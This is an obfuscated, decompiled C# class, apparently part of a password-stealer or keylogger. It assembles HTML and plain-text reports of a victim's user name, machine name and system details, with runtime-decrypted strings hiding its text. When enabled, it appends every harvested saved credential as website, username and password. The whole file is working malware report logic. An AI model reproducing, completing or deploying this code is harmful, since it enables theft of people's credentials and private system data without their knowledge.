using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;

internal class Class19
{
	public class Class20
	{
		private string string_0;

		private bool bool_0;

		internal string String_0
		{
			get
			{
				return string_0;
			}
			set
			{
				string_0 = value;
			}
		}

		internal bool Boolean_0
		{
			get
			{
				return bool_0;
			}
			set
			{
				bool_0 = value;
			}
		}
	}

	public static string smethod_0(Class20 class20_0)
	{
		StringBuilder stringBuilder_ = new StringBuilder();
		stringBuilder_.Append(_003CModule_003E.smethod_0("ᄸᅠᅭᅲᄤᅷᅰᅽᅨᅡᄹᄦᅢᅫᅪᅰᄩᅢᅥᅩᅭᅨᅽᄾᅒᅡᅶᅠᅥᅪᅥᄨᄤᅃᅡᅪᅡᅲᅥᄨᄤᅷᅥᅪᅷᄩᅷᅡᅶᅭᅢᄿᄤᅦᅫᅶᅠᅡᅶᄩᅧᅫᅨᅫᅶᄾᄧᅇᅇᅇᄿᄤᅦᅫᅶᅠᅡᅶᄩᅳᅭᅠᅰᅬᄾᅰᅬᅭᅪᄿᄤᅦᅫᅶᅠᅡᅶᄩᅷᅰᅽᅨᅡᄾᅷᅫᅨᅭᅠᄿᄦᄺ", 4356));
		stringBuilder_.Append(_003CModule_003E.smethod_0("ᅛᄃᄎᄑᅇᄔᄓᄞᄋᄂᅚᅅᄁᄈᄉᄓᅊᄁᄆᄊᄎᄋᄞᅝᄱᄂᄕᄃᄆᄉᄆᅋᅇᄠᄂᄉᄂᄑᄆᅋᅇᄔᄆᄉᄔᅊᄔᄂᄕᄎᄁᅜᅇᄓᄂᄟᄓᅊᄆᄋᄎᄀᄉᅝᄄᄂᄉᄓᄂᄕᅜᅇᄁᄈᄉᄓᅊᄔᄎᄝᄂᅝᅖᅑᄗᄟᅜᄁᄈᄉᄓᅊᄐᄂᄎᄀᄏᄓᅝᅒᅗᅗᅜᅇᄄᄈᄋᄈᄕᅝᅄᅑᅑᅑᅜᅅᅙᅛᄁᄈᄉᄓᅇᄔᄎᄝᄂᅚᅅᅌᅑᅅᅙᄵᄎᄉᅇᄫᄈᄀᄀᄂᄕᅛᅈᄁᄈᄉᄓᅙᅛᄅᄕᅇᅈᅙᅛᄒᄋᅙᅛᄒᄋᅙᅛᄒᄋᅙᅛᄒᄋᅙᅛᄒᄋᅙᅛᄒᄋᅙᄜᅇᄦᄒᄓᄒᄊᄉᅇᄢᄃᄎᄓᄎᄈᄉᅇᄚᅛᅈᄒᄋᅙᅛᅈᄒᄋᅙᅛᅈᄒᄋᅙᅛᅈᄒᄋᅙᅛᅈᄒᄋᅙᅛᅈᄒᄋᅙᅛᅈᄃᄎᄑᅙ", 4455));
		stringBuilder_.Append(string.Format(_003CModule_003E.smethod_0("ᅱᄸᄡᅳᅱᄩᄤᄻᅳᅱᄫᄢᄣᄹᅭᄮᄢᄡᄢᄿᅰᅯᅮᅻᅻᅻᅯᅳᄁᄢᄪᄪᄨᄩᅭᄂᄣᅭᄶᅽᄰᅱᅢᄫᄢᄣᄹᅳᅱᄯᄿᅭᅢᅳᅱᄯᄿᅭᅢᅳᅱᄯᅳᄘᄾᄨᄿᄣᄬᄠᄨᅷᅱᅢᄯᅳᅭᄶᅼᄰᅱᄯᄿᅭᅢᅳᅱᄯᅳᄀᄬᄮᄥᄤᄣᄨᅷᅱᅢᄯᅳᅭᄶᅿᄰᅱᄯᄿᅭᅢᅳᅱᄯᅳᄎᄢᄸᄣᄹᄿᄴᅷᅱᅢᄯᅳᅭᄶᅾᄰᅱᄯᄿᅭᅢᅳᅱᄯᅳᄄᄝᅭᄌᄩᄩᄿᄨᄾᄾᅷᅱᅢᄯᅳᅭᄶᅹᄰᅱᄯᄿᅭᅢᅳᅱᄯᄿᅭᅢᅳᅱᄯᄿᅭᅢᅳᅱᄯᅳᄂᄞᅭᄛᄨᄿᄾᄤᄢᄣᅷᅱᅢᄯᅳᅭᄶᅸᄰᅭᅥᄶᅻᄰᅤᅱᄯᄿᅭᅢᅳᅱᄯᅳᄂᄞᅭᄟᄌᄀᅷᅱᅢᄯᅳᅭᄶᅺᄰᅱᄯᄿᅭᅢᅳᅱᄯᅳᄂᄞᅭᄞᄨᄿᄤᄬᄡᅭᄃᄸᄠᄯᄨᄿᅷᅱᅢᄯᅳᅭᄶᅵᄰᅱᄯᄿᅭᅢᅳᅱᄯᄿᅭᅢᅳᅱᄯᄿᅭᅢᅳ", 4429), Class12.smethod_11(), Environment.UserName, Environment.MachineName, Class12.smethod_14(), Class12.smethod_7(), Class12.smethod_19(), Class12.smethod_21(), Class12.smethod_20().ToString().Remove(Class12.smethod_20().ToString().Length - 6) + _003CModule_003E.smethod_0("ᶎ\u1de3\u1dec", 7598), Class12.smethod_22()));
		if (class20_0.Boolean_0)
		{
			stringBuilder_.Append(_003CModule_003E.smethod_0("௬ல௮\u0b9d\u0bbfபஹ\u0bbc\u0bbcற௰\u0b96ஹ\u0ba2வஶ\u0bbfந௬\u0bffல௮", 3024));
			List<Class18> list = Class21.smethod_0();
			if (list.Count == 0)
			{
				stringBuilder_.Append(_003CModule_003E.smethod_0("࿄\u0f9aྊ࿘࿗\u0fc6࿄\u0f9aྊ࿘࿗\u0fc6࿄\u0f9a\u0fc6\u0fb6\u0f97\u0f96\u0f9d࿄࿗\u0f9a\u0fc6", 4088));
			}
			else
			{
				smethod_1(ref stringBuilder_);
			}
		}
		Regex regex = new Regex(_003CModule_003E.smethod_0("༳༴༻༆༛༃༊ཕཏཁ༔ཟགྷཞཟཟ༒༯ཁ༔ཟགྷཛྷཟ༒༳༲", 3951));
		foreach (Match item in regex.Matches(class20_0.String_0))
		{
			class20_0.String_0 = class20_0.String_0.Replace(item.ToString(), _003CModule_003E.smethod_0("✴❻❸❩❦✨❻❼❱❤❭✵✪❪❩❫❣❯❺❧❽❦❬✥❫❧❤❧❺✲✫✸❋❎✳✨❫❧❤❧❺✲✫❎❎❎✳✨❪❧❺❬❭❺✥❫❧❤❧❺✲✫✸✸✸✳✨❪❧❺❬❭❺✥❻❼❱❤❭✲❻❧❤❡❬✳✨❪❧❺❬❭❺✥❿❡❬❼❠✲❼❠❡❦✳✪✶", 9992) + item.ToString() + _003CModule_003E.smethod_0("ᖂᖑᗍᗎᗟᗐᖀ", 5566));
		}
		Regex regex2 = new Regex(_003CModule_003E.smethod_0("ℐ℗ⅢℷⅽⅠⅽⅼℱⅳℐℑ", 8524));
		foreach (Match item2 in regex2.Matches(class20_0.String_0))
		{
			class20_0.String_0 = class20_0.String_0.Replace(item2.ToString(), _003CModule_003E.smethod_0("ᬑ᭞᭝\u1b4c\u1b43ᬍ᭞᭙᭔\u1b41ᭈᬐᬏ\u1b4f\u1b4c\u1b4eᭆᭊ᭟\u1b42᭘\u1b43ᭉ\u1b00\u1b4e\u1b42\u1b41\u1b42᭟ᬗᬎᬝ\u1b6bᬔᬖᬍ\u1b4e\u1b42\u1b41\u1b42᭟ᬗᬎ\u1b6b\u1b6b\u1b6bᬖᬏᬓ", 6957) + item2.ToString() + _003CModule_003E.smethod_0("ऽमॲॱॠ९\u093f", 2305));
		}
		class20_0.String_0 = class20_0.String_0.Replace(Environment.NewLine, _003CModule_003E.smethod_0("ਵ੫\u0a7b\u0a29ਦ\u0a37", 2569));
		stringBuilder_.AppendLine(class20_0.String_0);
		stringBuilder_.Append(_003CModule_003E.smethod_0("⎍⎞⏕⏘⏇⎏⎍⎞⏄⏝⎏", 9137));
		stringBuilder_.Append(_003CModule_003E.smethod_0("ᦉᦚ᧑\u19dcᧃᦋ", 6581));
		return stringBuilder_.ToString();
	}

	private static void smethod_1(ref StringBuilder stringBuilder_0)
	{
		foreach (Class18 item in Class21.smethod_0())
		{
			stringBuilder_0.Append($"<br /><br /><b>Website:</b> {item.String_2}<br /><b>Username:</b> {item.String_0}<br /><b>Password:</b> {item.String_1}");
		}
	}

	public static string smethod_2(Class20 class20_0)
	{
		StringBuilder stringBuilder_ = new StringBuilder();
		stringBuilder_.AppendLine(_003CModule_003E.smethod_0("᧕᧮᧩ᦧ\u19cb᧨᧠᧠᧢᧵ᦧ᧼ᦧᧆ᧲᧳᧲᧪᧩ᦧᧂ᧣᧮᧳᧮᧨᧩ᦧ᧺", 6535));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("−≔≷≿≿≽≼∸≗≶∸≣∨≥", 8728), Class12.smethod_11()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("ഌ\u0d53൵\u0d63൴൨൧൫\u0d63\u0d3cദൽശൻ", 3334), Environment.UserName));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("\u09d9৵৷ৼ৽৺ৱম\u09b4৯ত৩", 2452), Environment.MachineName));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("\u2437\u242e\u245e\u243f␚␚␌␛␍␍⑄\u245e␅\u244e␃", 9342), Class12.smethod_7()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("ޒߗߋ\u07b8ߎ\u07fdߪ\u07eb\u07f1߷߶ޢ\u07b8ߣ\u07a8ߥ\u07b8\u07b0ߣ\u07a9ߥޱ", 1944), Class12.smethod_19(), Class12.smethod_21()));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("₇ₛ\u20e8ₚ₉₅\u20f2\u20e8₳\u20f8₵\u20e8₳\u20f9₵", 8392), Class12.smethod_20().ToString().Remove(Class12.smethod_20().ToString().Length - 6), _003CModule_003E.smethod_0("⒞⒑⒠", 9427)));
		stringBuilder_.AppendLine(string.Format(_003CModule_003E.smethod_0("ǏǓƠǓǥǲǩǡǬƠǎǵǭǢǥǲƺƠǻưǽ", 384), Class12.smethod_22()));
		stringBuilder_.AppendLine();
		if (class20_0.Boolean_0)
		{
			stringBuilder_.AppendLine(_003CModule_003E.smethod_0("ƆƤƱƢƧƧƪǫƍƢƹƮƭƤƳ", 459));
			stringBuilder_.AppendLine();
			List<Class18> list = Class21.smethod_0();
			if (list.Count == 0)
			{
				stringBuilder_.AppendLine(_003CModule_003E.smethod_0("ỴổỔở", 7866));
			}
			else
			{
				smethod_3(ref stringBuilder_);
			}
		}
		stringBuilder_.AppendLine(class20_0.String_0);
		return stringBuilder_.ToString();
	}

	private static void smethod_3(ref StringBuilder stringBuilder_0)
	{
		foreach (Class18 item in Class21.smethod_0())
		{
			stringBuilder_0.AppendLine(string.Format("Website: {0} {3}Username: {1} {3}Password:{2}", item.String_2, item.String_0, item.String_1, Environment.NewLine));
			stringBuilder_0.AppendLine();
		}
	}
}
